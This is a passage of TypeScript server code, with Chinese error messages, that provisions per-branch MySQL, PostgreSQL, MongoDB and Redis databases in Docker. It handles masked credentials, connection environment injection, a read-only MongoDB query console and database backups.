      ? (branchEnv.MONGODB_AUTH_SOURCE || branchEnv.MONGO_AUTH_SOURCE || (branchUser ? database : 'admin'))
      : '';
    const uri = user
      ? `mongodb://${encodeURIComponent(user)}:${encodeURIComponent(password)}@localhost:27017/${encodeURIComponent(database)}?authSource=${encodeURIComponent(authSourceDb)}`
      : `mongodb://localhost:27017/${encodeURIComponent(database)}`;
    return { user, password, database, uri, secrets: [password] };
  }

  async function runMongoJson(service: InfraService, branch: BranchEntry, script: string, databaseOverride?: string, timeoutMs = 30_000): Promise<unknown> {
    if (service.status !== 'running') {
      throw new Error(`MongoDB 服务当前未运行（status=${service.status}）`);
    }
    const creds = mongoCredentials(service, branch, databaseOverride);
    const result = await shell.exec(
      `docker exec ${shq(service.containerName || '')} mongosh ${shq(creds.uri)} --quiet --eval ${shq(script)}`,
      { timeout: timeoutMs },
    );
    const stdout = maskTextSecrets((result.stdout || '').trim(), creds.secrets);
    const stderr = maskTextSecrets((result.stderr || '').trim(), creds.secrets);
    if (result.exitCode !== 0) {
      throw new Error(stderr || stdout || 'MongoDB 查询失败');
    }
    const jsonLine = stdout.split('\n').reverse().find((line) => {
      const t = line.trim();
      return t.startsWith('{') || t.startsWith('[');
    }) || stdout;
    try {
      return JSON.parse(jsonLine);
    } catch {
      throw new Error(`MongoDB 返回非 JSON 输出: ${stdout.slice(0, 500)}`);
    }
  }

  function mongoCollectionFromRequest(input: unknown): string {
    const value = String(input || '').trim();
    if (!value || value.length > 120 || /[\0\r\n]/.test(value) || value.includes('$cmd')) {
      throw new Error('collection 名不合法');
    }
    return value;
  }

  function mongoJsonObject(input: unknown, label: string): Record<string, unknown> {
    if (input === undefined || input === null || input === '') return {};
    if (typeof input === 'object' && !Array.isArray(input)) return input as Record<string, unknown>;
    if (typeof input === 'string') {
      const parsed = JSON.parse(input);
      if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) return parsed as Record<string, unknown>;
    }
    throw new Error(`${label} 必须是 JSON object`);
  }

  function mongoSafeJson(value: unknown): string {
    const text = JSON.stringify(value ?? {});
    if (text.length > 20_000) throw new Error('MongoDB 查询 JSON 过长（上限 20KB）');
    return text;
  }

  function normalizeMongoFindCommand(commandInput: unknown): { collection: string; script: string } {
    const command = String(commandInput || '').trim();
    if (!command) throw new Error('MongoDB 命令不能为空');
    if (command.length > 20_000) throw new Error('MongoDB 命令过长（上限 20KB）');
    const withoutTrailing = command.replace(/;+$/g, '').trim();
    if (withoutTrailing.includes(';')) {
      throw new Error('MongoDB Console 一次只允许执行一条命令');
    }
    if (/\b(insert|insertOne|insertMany|update|updateOne|updateMany|delete|deleteOne|deleteMany|drop|dropDatabase|dropCollection|create|createCollection|aggregate|mapReduce|eval|runCommand|adminCommand|getSiblingDB|copyDatabase|shutdownServer)\b/i.test(withoutTrailing) || /\$where/i.test(withoutTrailing)) {
      throw new Error('MongoDB Console 当前只允许只读 find 查询');
    }

    const getCollectionMatch = withoutTrailing.match(/^db\.getCollection\((["'])([^"'\r\n]{1,120})\1\)\.find\s*\(/);
    const dotCollectionMatch = withoutTrailing.match(/^db\.([a-zA-Z0-9_$-]{1,120})\.find\s*\(/);
    const collection = getCollectionMatch?.[2] || dotCollectionMatch?.[1] || '';
    if (!collection) {
      throw new Error('MongoDB Console 当前只支持 db.getCollection("collection").find(...) 或 db.collection.find(...)');
    }
    mongoCollectionFromRequest(collection);
    if (!/\.limit\s*\(\s*\d{1,3}\s*\)\s*$/.test(withoutTrailing)) {
      throw new Error('MongoDB find 查询必须显式追加 limit(1-100)');
    }
    const limitRaw = Number(withoutTrailing.match(/\.limit\s*\(\s*(\d{1,3})\s*\)\s*$/)?.[1] || 0);
    if (!Number.isFinite(limitRaw) || limitRaw < 1 || limitRaw > 100) {
      throw new Error('MongoDB limit 必须在 1-100 之间');
    }

    return {
      collection,
      script: `JSON.stringify((${withoutTrailing}).toArray())`,
    };
  }

  async function runRedisCli(service: InfraService, args: string[], timeoutMs = 15_000): Promise<string> {
    if (service.status !== 'running') {
      throw new Error(`Redis 服务当前未运行（status=${service.status}）`);
    }
    const password = redisPassword(service);
    const authArgs = password ? ['-a', password, '--no-auth-warning'] : [];
    const result = await shell.exec(
      ['docker', 'exec', shq(service.containerName || ''), 'redis-cli', '--raw', ...authArgs.map(shq), ...args.map(shq)].join(' '),
      { timeout: timeoutMs },
    );
    const output = maskTextSecrets((result.stdout || '').trim(), [password]);
    const error = maskTextSecrets((result.stderr || '').trim(), [password]);
    if (result.exitCode !== 0) {
      throw new Error(error || output || 'Redis 命令执行失败');
    }
    return output;
  }

  function redisKeyFromRequest(input: unknown): string {
    const value = String(input || '');
    if (!value || value.length > 512) throw new Error('Redis key 不合法');
    return value;
  }

  async function redisKeyMeta(service: InfraService, key: string): Promise<{ key: string; type: string; ttl: number; memoryBytes: number | null }> {
    const [type, ttlRaw, memoryRaw] = await Promise.all([
      runRedisCli(service, ['TYPE', key]),
      runRedisCli(service, ['TTL', key]),
      runRedisCli(service, ['MEMORY', 'USAGE', key]).catch(() => ''),
    ]);
    const memoryBytes = Number(memoryRaw);
    return {
      key,
      type: type || 'none',
      ttl: Number(ttlRaw),
      memoryBytes: Number.isFinite(memoryBytes) ? memoryBytes : null,
    };
  }

  async function redisValuePreview(service: InfraService, key: string, type: string): Promise<{ kind: string; values: string[]; truncated: boolean }> {
    if (type === 'string') {
      const value = await runRedisCli(service, ['GET', key]);
      return { kind: 'string', values: [value], truncated: value.length > 4096 };
    }
    if (type === 'list') {
      const value = await runRedisCli(service, ['LRANGE', key, '0', '49']);
      return { kind: 'list', values: value ? value.split('\n') : [], truncated: false };
    }
    if (type === 'set') {
      const value = await runRedisCli(service, ['SMEMBERS', key]);
      return { kind: 'set', values: value ? value.split('\n').slice(0, 50) : [], truncated: value.split('\n').length > 50 };
    }
    if (type === 'zset') {
      const value = await runRedisCli(service, ['ZRANGE', key, '0', '49', 'WITHSCORES']);
      return { kind: 'zset', values: value ? value.split('\n') : [], truncated: false };
    }
    if (type === 'hash') {
      const value = await runRedisCli(service, ['HGETALL', key]);
      return { kind: 'hash', values: value ? value.split('\n').slice(0, 100) : [], truncated: value.split('\n').length > 100 };
    }
    return { kind: type || 'unknown', values: [], truncated: false };
  }

  async function createMysqlBranchDatabase(service: InfraService, branch: BranchEntry, targetDatabase: string): Promise<MysqlBranchDatabaseResult> {
    const branchUser = branchDatabaseUser(branch);
    const branchPassword = randomUUID().replace(/-/g, '').slice(0, 24);
    const rootPassword = mysqlRootPassword(service);
    const sql = [
      `CREATE DATABASE IF NOT EXISTS ${sqlIdent(targetDatabase)} CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci`,
      `CREATE USER IF NOT EXISTS ${sqlString(branchUser)}@'%' IDENTIFIED BY ${sqlString(branchPassword)}`,
      `ALTER USER ${sqlString(branchUser)}@'%' IDENTIFIED BY ${sqlString(branchPassword)}`,
      `GRANT ALL PRIVILEGES ON ${sqlIdent(targetDatabase)}.* TO ${sqlString(branchUser)}@'%'`,
      'FLUSH PRIVILEGES',
    ].join('; ');
    const result = await shell.exec(
      `docker exec ${shq(service.containerName || '')} mysql -uroot${mysqlPasswordArg(rootPassword)} -e ${shq(sql)}`,
      { timeout: 60_000 },
    );
    if (result.exitCode !== 0) {
      throw new Error(maskTextSecrets((result.stderr || result.stdout || 'MySQL 分支库创建失败').trim(), [rootPassword, branchPassword]));
    }
    const internalHost = service.id;
    const internalPort = service.containerPort || 3306;
    const databaseUrl = `mysql://${branchUser}:${branchPassword}@${internalHost}:${internalPort}/${targetDatabase}`;
    const injectedEnv: Record<string, string> = {
      DATABASE_URL: databaseUrl,
      MYSQL_HOST: internalHost,
      MYSQL_PORT: String(internalPort),
      MYSQL_DATABASE: targetDatabase,
      MYSQL_USER: branchUser,
      MYSQL_PASSWORD: branchPassword,
    };
    const maskedInjectedEnv = {
      ...injectedEnv,
      DATABASE_URL: `mysql://${branchUser}:******@${internalHost}:${internalPort}/${targetDatabase}`,
      MYSQL_PASSWORD: '******',
    };
    return { branchUser, branchPassword, database: targetDatabase, internalHost, internalPort, databaseUrl, injectedEnv, maskedInjectedEnv };
  }

  function buildMysqlConnectionEnv(params: {
    service: InfraService;
    branch: BranchEntry;
    branchUser: string;
    branchPassword: string;
    database: string;
  }): MysqlConnectionEnvResult {
    const { service, branchUser, branchPassword, database } = params;
    const internalHost = service.id;
    const internalPort = service.containerPort || 3306;
    const databaseUrl = `mysql://${branchUser}:${branchPassword}@${internalHost}:${internalPort}/${database}`;
    const injectedEnv: Record<string, string> = {
      DATABASE_URL: databaseUrl,
      MYSQL_HOST: internalHost,
      MYSQL_PORT: String(internalPort),
      MYSQL_DATABASE: database,
      MYSQL_USER: branchUser,
      MYSQL_PASSWORD: branchPassword,
    };
    return {
      branchUser,
      branchPassword,
      database,
      internalHost,
      internalPort,
      injectedEnv,
      maskedInjectedEnv: {
        ...injectedEnv,
        DATABASE_URL: `mysql://${branchUser}:******@${internalHost}:${internalPort}/${database}`,
        MYSQL_PASSWORD: '******',
      },
    };
  }

  function getExistingMysqlConnectionEnv(service: InfraService, branch: BranchEntry): MysqlConnectionEnvResult | null {
    const branchEnv = stateService.getCustomEnvScope(branch.id);
    const branchPassword = branchEnv.MYSQL_PASSWORD || '';
    const branchUser = branchEnv.MYSQL_USER || '';
    if (!branchUser || !branchPassword) return null;
    return buildMysqlConnectionEnv({
      service,
      branch,
      branchUser,
      branchPassword,
      database: mysqlDatabaseForBranch(service, branch),
    });
  }

  function buildPostgresConnectionEnv(params: {
    service: InfraService;
    branchUser: string;
    branchPassword: string;
    database: string;
  }): MysqlConnectionEnvResult {
    const { service, branchUser, branchPassword, database } = params;
    const internalHost = service.id;
    const internalPort = service.containerPort || 5432;
    const databaseUrl = `postgresql://${branchUser}:${branchPassword}@${internalHost}:${internalPort}/${database}`;
    const injectedEnv: Record<string, string> = {
      DATABASE_URL: databaseUrl,
      POSTGRES_URL: databaseUrl,
      POSTGRES_HOST: internalHost,
      POSTGRES_PORT: String(internalPort),
      POSTGRES_DB: database,
      POSTGRES_USER: branchUser,
      POSTGRES_PASSWORD: branchPassword,
    };
    return {
      branchUser,
      branchPassword,
      database,
      internalHost,
      internalPort,
      injectedEnv,
      maskedInjectedEnv: {
        ...injectedEnv,
        DATABASE_URL: `postgresql://${branchUser}:******@${internalHost}:${internalPort}/${database}`,
        POSTGRES_URL: `postgresql://${branchUser}:******@${internalHost}:${internalPort}/${database}`,
        POSTGRES_PASSWORD: '******',
      },
    };
  }

  async function createPostgresBranchDatabase(service: InfraService, branch: BranchEntry, targetDatabase: string): Promise<MysqlConnectionEnvResult> {
    if (service.status !== 'running') {
      throw new Error(`PostgreSQL 服务当前未运行（status=${service.status}）`);
    }
    if (!targetDatabase || !/^[a-zA-Z0-9_]+$/.test(targetDatabase)) {
      throw new Error(`目标数据库名不合法: ${targetDatabase || '(empty)'}`);
    }
    const branchUser = branchDatabaseUser(branch).slice(0, 63);
    const branchPassword = randomUUID().replace(/-/g, '').slice(0, 24);
    const env = resolvedInfraEnv(service);
    const adminUser = env.POSTGRES_USER || 'postgres';
    const adminPassword = env.POSTGRES_PASSWORD || '';
    const adminDb = env.POSTGRES_DB || adminUser || 'postgres';
    const sql = [
      `DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_roles WHERE rolname = ${pgString(branchUser)}) THEN CREATE ROLE ${pgIdent(branchUser)} LOGIN PASSWORD ${pgString(branchPassword)}; END IF; END $$;`,
      `ALTER ROLE ${pgIdent(branchUser)} WITH LOGIN PASSWORD ${pgString(branchPassword)};`,
      `SELECT 'CREATE DATABASE ${pgIdent(targetDatabase)} OWNER ${pgIdent(branchUser)}' WHERE NOT EXISTS (SELECT 1 FROM pg_database WHERE datname = ${pgString(targetDatabase)})\\gexec`,
      `GRANT ALL PRIVILEGES ON DATABASE ${pgIdent(targetDatabase)} TO ${pgIdent(branchUser)};`,
    ].join('\n');
    const result = await shell.exec(
      `printf %s ${shq(sql)} | docker exec -i -e PGPASSWORD=${shq(adminPassword)} ${shq(service.containerName || '')} psql -U ${shq(adminUser)} -d ${shq(adminDb)} -v ON_ERROR_STOP=1`,
      { timeout: 60_000 },
    );
    if (result.exitCode !== 0) {
      throw new Error(maskTextSecrets((result.stderr || result.stdout || 'PostgreSQL 分支库创建失败').trim(), [adminPassword, branchPassword]));
    }
    return buildPostgresConnectionEnv({ service, branchUser, branchPassword, database: targetDatabase });
  }

  function buildMongoConnectionEnv(params: {
    service: InfraService;
    branchUser: string;
    branchPassword: string;
    database: string;
  }): MysqlConnectionEnvResult {
    const { service, branchUser, branchPassword, database } = params;
    const internalHost = service.id;
    const internalPort = service.containerPort || 27017;
    const authPart = branchUser ? `${encodeURIComponent(branchUser)}:${encodeURIComponent(branchPassword)}@` : '';
    const authSourceDb = branchUser ? database : '';
    const authSource = authSourceDb ? `?authSource=${encodeURIComponent(authSourceDb)}` : '';
    const databaseUrl = `mongodb://${authPart}${internalHost}:${internalPort}/${encodeURIComponent(database)}${authSource}`;
    const injectedEnv: Record<string, string> = {
      DATABASE_URL: databaseUrl,
      MONGODB_URL: databaseUrl,
      MONGO_INITDB_DATABASE: database,
      MONGODB_DATABASE: database,
      MONGODB_HOST: internalHost,
      MONGODB_PORT: String(internalPort),
      ...(authSourceDb ? { MONGODB_AUTH_SOURCE: authSourceDb } : {}),
    };
    if (branchUser) {
      injectedEnv.MONGODB_USERNAME = branchUser;
      injectedEnv.MONGODB_PASSWORD = branchPassword;
    }
    const maskedUrl = branchUser
      ? `mongodb://${encodeURIComponent(branchUser)}:******@${internalHost}:${internalPort}/${encodeURIComponent(database)}${authSource}`
      : databaseUrl;
    return {
      branchUser,
      branchPassword,
      database,
      internalHost,
      internalPort,
      injectedEnv,
      maskedInjectedEnv: {
        ...injectedEnv,
        DATABASE_URL: maskedUrl,
        MONGODB_URL: maskedUrl,
        ...(branchUser ? { MONGODB_PASSWORD: '******' } : {}),
      },
    };
  }

  function mongoAdminUri(service: InfraService): { uri: string; secrets: string[]; rootUser: string; rootPassword: string } {
    const env = resolvedInfraEnv(service);
    const rootUser = env.MONGO_INITDB_ROOT_USERNAME
      || env.MONGO_USERNAME
      || env.MONGODB_USERNAME
      || '';
    const rootPassword = env.MONGO_INITDB_ROOT_PASSWORD
      || env.MONGO_PASSWORD
      || env.MONGODB_PASSWORD
      || '';
    const uri = rootUser
      ? `mongodb://${encodeURIComponent(rootUser)}:${encodeURIComponent(rootPassword)}@localhost:27017/admin`
      : 'mongodb://localhost:27017/admin';
    return { uri, secrets: [rootPassword], rootUser, rootPassword };
  }

  async function runMongoAdminScript(service: InfraService, script: string, timeoutMs = 60_000): Promise<void> {
    if (service.status !== 'running') {
      throw new Error(`MongoDB 服务当前未运行（status=${service.status}）`);
    }
    const admin = mongoAdminUri(service);
    const result = await shell.exec(
      `docker exec ${shq(service.containerName || '')} mongosh ${shq(admin.uri)} --quiet --eval ${shq(script)}`,
      { timeout: timeoutMs },
    );
    if (result.exitCode !== 0) {
      throw new Error(maskTextSecrets((result.stderr || result.stdout || 'MongoDB 管理命令失败').trim(), admin.secrets));
    }
  }

  async function createMongoBranchDatabase(service: InfraService, branch: BranchEntry, targetDatabase: string): Promise<MysqlConnectionEnvResult> {
    if (!targetDatabase || !/^[a-zA-Z0-9_]+$/.test(targetDatabase)) {
      throw new Error(`目标数据库名不合法: ${targetDatabase || '(empty)'}`);
    }
    const admin = mongoAdminUri(service);
    const branchUser = admin.rootUser ? branchDatabaseUser(branch).slice(0, 63) : '';
    const branchPassword = branchUser ? randomUUID().replace(/-/g, '').slice(0, 24) : '';
    const script = branchUser
      ? [
        `const target = db.getSiblingDB(${mongoSafeJson(targetDatabase)});`,
        `if (!target.getUser(${mongoSafeJson(branchUser)})) { target.createUser({ user: ${mongoSafeJson(branchUser)}, pwd: ${mongoSafeJson(branchPassword)}, roles: [{ role: 'readWrite', db: ${mongoSafeJson(targetDatabase)} }] }); }`,
        `else { target.updateUser(${mongoSafeJson(branchUser)}, { pwd: ${mongoSafeJson(branchPassword)}, roles: [{ role: 'readWrite', db: ${mongoSafeJson(targetDatabase)} }] }); }`,
        'target.getCollection("__cds_branch").updateOne({ _id: "created" }, { $set: { at: new Date() } }, { upsert: true });',
      ].join(' ')
      : [
        `const target = db.getSiblingDB(${mongoSafeJson(targetDatabase)});`,
        'target.getCollection("__cds_branch").updateOne({ _id: "created" }, { $set: { at: new Date() } }, { upsert: true });',
      ].join(' ');
    await runMongoAdminScript(service, script);
    return buildMongoConnectionEnv({ service, branchUser, branchPassword, database: targetDatabase });
  }

  function getExistingPostgresConnectionEnv(service: InfraService, branch: BranchEntry): MysqlConnectionEnvResult | null {
    const branchEnv = stateService.getCustomEnvScope(branch.id);
    const branchUser = branchEnv.POSTGRES_USER || '';
    const branchPassword = branchEnv.POSTGRES_PASSWORD || '';
    const database = branchEnv.POSTGRES_DB || postgresDatabaseForBranch(service, branch);
    if (!branchUser || !branchPassword || !database) return null;
    return buildPostgresConnectionEnv({ service, branchUser, branchPassword, database });
  }

  function getExistingMongoConnectionEnv(service: InfraService, branch: BranchEntry): MysqlConnectionEnvResult | null {
    const branchEnv = stateService.getCustomEnvScope(branch.id);
    const database = branchEnv.MONGODB_DATABASE || branchEnv.MONGO_INITDB_DATABASE || mongoDatabaseForBranch(service, branch);
    const branchUser = branchEnv.MONGODB_USERNAME || '';
    const branchPassword = branchEnv.MONGODB_PASSWORD || '';
    const url = branchEnv.MONGODB_URL || branchEnv.DATABASE_URL || '';
    if (url) {
      const maskedUrl = maskConnectionString(url);
      return {
        branchUser,
        branchPassword,
        database,
        internalHost: service.id,
        internalPort: service.containerPort || 27017,
        injectedEnv: {
          DATABASE_URL: url,
          MONGODB_URL: url,
          MONGO_INITDB_DATABASE: database,
          MONGODB_DATABASE: database,
          ...(branchUser ? { MONGODB_USERNAME: branchUser } : {}),
          ...(branchPassword ? { MONGODB_PASSWORD: branchPassword } : {}),
        },
        maskedInjectedEnv: {
          DATABASE_URL: maskedUrl,
          MONGODB_URL: maskedUrl,
          MONGO_INITDB_DATABASE: database,
          MONGODB_DATABASE: database,
          ...(branchUser ? { MONGODB_USERNAME: branchUser } : {}),
          ...(branchPassword ? { MONGODB_PASSWORD: '******' } : {}),
        },
      };
    }
    if (!database) return null;
    return buildMongoConnectionEnv({ service, branchUser, branchPassword, database });
  }

  function getExistingResourceConnectionEnv(runtime: ReturnType<typeof resourceRuntimeKey>, service: InfraService, branch: BranchEntry): MysqlConnectionEnvResult | null {
    if (runtime === 'mysql') return getExistingMysqlConnectionEnv(service, branch);
    if (runtime === 'postgres') return getExistingPostgresConnectionEnv(service, branch);
    if (runtime === 'mongodb') return getExistingMongoConnectionEnv(service, branch);
    return null;
  }

  async function resetResourceBranchCredentials(runtime: ReturnType<typeof resourceRuntimeKey>, service: InfraService, branch: BranchEntry): Promise<MysqlConnectionEnvResult> {
    if (runtime === 'mysql') return resetMysqlBranchCredentials(service, branch);
    if (runtime === 'postgres') return createPostgresBranchDatabase(service, branch, postgresDatabaseForBranch(service, branch));
    if (runtime === 'mongodb') return createMongoBranchDatabase(service, branch, mongoDatabaseForBranch(service, branch));
    throw new Error(`${runtime} 暂不支持重置连接凭据`);
  }

  async function resetMysqlBranchCredentials(service: InfraService, branch: BranchEntry): Promise<MysqlConnectionEnvResult> {
    if (service.status !== 'running') {
      throw new Error(`MySQL 服务当前未运行（status=${service.status}）`);
    }
    const database = mysqlDatabaseForBranch(service, branch);
    if (!database || !/^[a-zA-Z0-9_]+$/.test(database)) {
      throw new Error(`数据库名不合法: ${database || '(empty)'}`);
    }
    const branchUser = branchDatabaseUser(branch);
    const branchPassword = randomUUID().replace(/-/g, '').slice(0, 24);
    const rootPassword = mysqlRootPassword(service);
    const sql = [
      `CREATE USER IF NOT EXISTS ${sqlString(branchUser)}@'%' IDENTIFIED BY ${sqlString(branchPassword)}`,
      `ALTER USER ${sqlString(branchUser)}@'%' IDENTIFIED BY ${sqlString(branchPassword)}`,
      `GRANT ALL PRIVILEGES ON ${sqlIdent(database)}.* TO ${sqlString(branchUser)}@'%'`,
      'FLUSH PRIVILEGES',
    ].join('; ');
    const result = await shell.exec(
      `docker exec ${shq(service.containerName || '')} mysql -uroot${mysqlPasswordArg(rootPassword)} -e ${shq(sql)}`,
      { timeout: 60_000 },
    );
    if (result.exitCode !== 0) {
      throw new Error(maskTextSecrets((result.stderr || result.stdout || 'MySQL 凭据重置失败').trim(), [rootPassword, branchPassword]));
    }
    return buildMysqlConnectionEnv({ service, branch, branchUser, branchPassword, database });
  }

  function injectBranchMysqlEnv(branch: BranchEntry, envToInject: Record<string, string>): void {
    for (const [key, value] of Object.entries(envToInject)) {
      stateService.setCustomEnvVar(key, value, branch.id);
    }
  }

  function maskConnectionString(connectionString: string): string {
    try {
      const url = new URL(connectionString);
      if (url.password) url.password = '******';
      if (url.username && /secret|token|password/i.test(url.username)) url.username = '******';
      return url.toString();
    } catch {
      return maskTextSecrets(connectionString, [connectionString]);
    }
  }

  function externalConnectionEnv(runtime: ReturnType<typeof resourceRuntimeKey>, connectionString: string): Record<string, string> {
    if (runtime === 'mysql') return { DATABASE_URL: connectionString, MYSQL_URL: connectionString };
    if (runtime === 'postgres') return { DATABASE_URL: connectionString, POSTGRES_URL: connectionString };
    if (runtime === 'mongodb') return { DATABASE_URL: connectionString, MONGODB_URL: connectionString };
    return { DATABASE_URL: connectionString };
  }

  function injectBranchEnv(branch: BranchEntry, envToInject: Record<string, string>): void {
    for (const [key, value] of Object.entries(envToInject)) {
      stateService.setCustomEnvVar(key, value, branch.id);
    }
  }

  function injectEnvIntoProfileOverride(branch: BranchEntry, profileId: string, envToInject: Record<string, string>): BuildProfileOverride {
    const current = stateService.getBranchProfileOverride(branch.id, profileId) || {};
    const next: BuildProfileOverride = {
      ...current,
      env: {
        ...(current.env || {}),
        ...envToInject,
      },
      notes: current.notes || 'CDS resource connection injected',
    };
    stateService.setBranchProfileOverride(branch.id, profileId, next);
    return stateService.getBranchProfileOverride(branch.id, profileId) || next;
  }

  function resourceBackupDir(): string {
    return `/data/cds/${stateService.projectSlug}/backups`;
  }

  function sanitizeBackupFileName(name: unknown): string {
    const value = String(name || '').trim();
    const base = path.posix.basename(value);
    if (!value || value !== base || value.includes('..')) {
      throw new Error('非法备份文件名');
    }
    return value;
  }

  function mysqlDatabaseForBranch(service: InfraService, branch: BranchEntry): string {
    const branchEnv = stateService.getCustomEnvScope(branch.id);
    const env = resolvedInfraEnv(service, branch);
    return String(
      branchEnv.MYSQL_DATABASE
        || env.MYSQL_DATABASE
        || env.MARIADB_DATABASE
        || resolvedServiceDbName(service)
        || 'app',
    )
      .replace(/[^a-zA-Z0-9_]/g, '_')
      .slice(0, 64);
  }

  function resourceBackupExtension(runtime: ResourceDatabaseRuntime): string {
    if (runtime === 'mongodb') return '.archive.gz';
    if (runtime === 'redis') return '.rdb';
    return '.sql.gz';
  }

  function resourceDatabaseForRuntime(runtime: ResourceDatabaseRuntime, service: InfraService, branch: BranchEntry): string | undefined {
    if (runtime === 'mysql') return mysqlDatabaseForBranch(service, branch);
    if (runtime === 'postgres') return postgresDatabaseForBranch(service, branch);
    if (runtime === 'mongodb') return mongoDatabaseForBranch(service, branch);
    return undefined;
  }

  function makeResourceBackupFileName(params: {
    service: InfraService;
    branch: BranchEntry;
    runtime: ResourceDatabaseRuntime;
    database?: string;
    reason: 'manual' | 'pre-restore';
  }): string {
    const { service, branch, runtime, database, reason } = params;
    const stamp = new Date().toISOString().replace(/[-:]/g, '').replace(/\.\d{3}Z$/, 'Z');
    const safeDatabase = String(database || 'instance').replace(/[^a-zA-Z0-9_]/g, '_').slice(0, 64);
    return `${service.id}-${branch.id}-${safeDatabase}-${runtime}-${reason}-${stamp}${resourceBackupExtension(runtime)}`;
  }

  async function listResourceBackupEntries(service: InfraService, branch: BranchEntry, runtime: ResourceDatabaseRuntime, database?: string): Promise<ResourceBackupEntry[]> {
    const dir = resourceBackupDir();
    const ext = resourceBackupExtension(runtime);
    const result = await shell.exec(
      `mkdir -p ${shq(dir)} && find ${shq(dir)} -maxdepth 1 -type f -name ${shq(`${service.id}-${branch.id}-*${ext}`)} -printf '%f\t%s\t%T@\\n' | sort -r -k3`,
      { timeout: 15_000 },
    );
    if (result.exitCode !== 0) {
      throw new Error((result.stderr || result.stdout || '读取备份列表失败').trim());
    }
    return result.stdout
      .split('\n')
      .map((line) => line.trim())
      .filter(Boolean)
      .map((line) => {
        const [name, sizeRaw, mtimeRaw] = line.split('\t');
        const mtimeMs = Number(mtimeRaw) * 1000;
        return {
          id: name,
          name,
          sizeBytes: Number(sizeRaw) || 0,
          createdAt: Number.isFinite(mtimeMs) ? new Date(mtimeMs).toISOString() : new Date().toISOString(),
          runtime,
          ...(database ? { database } : {}),
        };
      });
  }

  async function statBackupEntry(fileName: string, runtime: ResourceDatabaseRuntime, database?: string): Promise<ResourceBackupEntry> {
    const filePath = path.posix.join(resourceBackupDir(), fileName);
    const stat = await shell.exec(`stat -c '%s\t%Y' ${shq(filePath)}`, { timeout: 10_000 });
    const [sizeRaw, mtimeRaw] = stat.stdout.trim().split('\t');
    const mtimeMs = Number(mtimeRaw) * 1000;
    return {
      id: fileName,
      name: fileName,
      sizeBytes: Number(sizeRaw) || 0,
      createdAt: Number.isFinite(mtimeMs) ? new Date(mtimeMs).toISOString() : new Date().toISOString(),
      runtime,
      ...(database ? { database } : {}),
    };
  }

  async function createMysqlBackupFile(params: {
    service: InfraService;
    branch: BranchEntry;
    resourceId: string;
    resourceName: string;
    projectId: string;
    actor: string;
    reason: 'manual' | 'pre-restore';
  }): Promise<ResourceBackupEntry> {
    const { service, branch, resourceId, resourceName, projectId, actor, reason } = params;
    if (service.status !== 'running') {
      throw new Error(`MySQL 服务当前未运行（status=${service.status}）`);
    }
    const database = mysqlDatabaseForBranch(service, branch);
    if (!database || !/^[a-zA-Z0-9_]+$/.test(database)) {
      throw new Error(`数据库名不合法: ${database || '(empty)'}`);
    }
    const dir = resourceBackupDir();
    const fileName = makeResourceBackupFileName({ service, branch, runtime: 'mysql', database, reason });
    const filePath = path.posix.join(dir, fileName);
    const rootPassword = mysqlRootPassword(service);
    const dumpCmd = `mysqldump -uroot${mysqlPasswordArg(rootPassword)} --single-transaction --quick --routines --triggers --events ${shq(database)} | gzip -c`;
    const result = await shell.exec(
      `mkdir -p ${shq(dir)} && docker exec ${shq(service.containerName || '')} sh -c ${shq(dumpCmd)} > ${shq(filePath)}`,
      { timeout: 1_800_000 },
    );
    if (result.exitCode !== 0) {
      throw new Error(maskTextSecrets((result.stderr || result.stdout || 'MySQL 备份失败').trim(), [rootPassword]));
    }
    const entry = await statBackupEntry(fileName, 'mysql', database);
    stateService.appendActivityLog(projectId, {
      type: 'resource-backup',
      branchId: branch.id,
      branchName: branch.branch,
      actor,
      resourceId,
      resourceName,
      result: 'success',
      note: `${resourceName} ${reason === 'pre-restore' ? '恢复前' : '手动'}备份已生成：${fileName}`,
    });
    return entry;
  }

  async function createPostgresBackupFile(params: {
    service: InfraService;
    branch: BranchEntry;
    resourceId: string;
    resourceName: string;
    projectId: string;
    actor: string;
    reason: 'manual' | 'pre-restore';
  }): Promise<ResourceBackupEntry> {
    const { service, branch, resourceId, resourceName, projectId, actor, reason } = params;
    if (service.status !== 'running') {
      throw new Error(`PostgreSQL 服务当前未运行（status=${service.status}）`);
    }
    const database = postgresDatabaseForBranch(service, branch);
    if (!database || !/^[a-zA-Z0-9_]+$/.test(database)) {
      throw new Error(`数据库名不合法: ${database || '(empty)'}`);
    }
    const dir = resourceBackupDir();
    const fileName = makeResourceBackupFileName({ service, branch, runtime: 'postgres', database, reason });
    const filePath = path.posix.join(dir, fileName);
    const creds = postgresClientCredentials(service, branch);
    const result = await shell.exec(
      `mkdir -p ${shq(dir)} && docker exec -e PGPASSWORD=${shq(creds.password)} ${shq(service.containerName || '')} pg_dump -U ${shq(creds.user)} -d ${shq(database)} --no-owner --no-privileges | gzip -c > ${shq(filePath)}`,
      { timeout: 1_800_000 },
    );
    if (result.exitCode !== 0) {
      throw new Error(maskTextSecrets((result.stderr || result.stdout || 'PostgreSQL 备份失败').trim(), creds.secrets));
    }
    const entry = await statBackupEntry(fileName, 'postgres', database);
    stateService.appendActivityLog(projectId, {
      type: 'resource-backup',
      branchId: branch.id,
      branchName: branch.branch,
      actor,
      resourceId,
      resourceName,
      result: 'success',
      note: `${resourceName} ${reason === 'pre-restore' ? '恢复前' : '手动'}备份已生成：${fileName}`,
    });
    return entry;
  }

  async function createMongoBackupFile(params: {
    service: InfraService;
    branch: BranchEntry;
    resourceId: string;
    resourceName: string;
    projectId: string;
    actor: string;
    reason: 'manual' | 'pre-restore';
  }): Promise<ResourceBackupEntry> {
    const { service, branch, resourceId, resourceName, projectId, actor, reason } = params;
    if (service.status !== 'running') {
      throw new Error(`MongoDB 服务当前未运行（status=${service.status}）`);
    }
    const database = mongoDatabaseForBranch(service, branch);
    const dir = resourceBackupDir();
    const fileName = makeResourceBackupFileName({ service, branch, runtime: 'mongodb', database, reason });
    const filePath = path.posix.join(dir, fileName);
    const creds = mongoCredentials(service, branch);
    const result = await shell.exec(
      `mkdir -p ${shq(dir)} && docker exec ${shq(service.containerName || '')} mongodump --uri ${shq(creds.uri)} --db ${shq(database)} --archive --gzip > ${shq(filePath)}`,
      { timeout: 1_800_000 },
    );
    if (result.exitCode !== 0) {
      throw new Error(maskTextSecrets((result.stderr || result.stdout || 'MongoDB 备份失败').trim(), creds.secrets));
    }
    const entry = await statBackupEntry(fileName, 'mongodb', database);
    stateService.appendActivityLog(projectId, {
      type: 'resource-backup',
      branchId: branch.id,
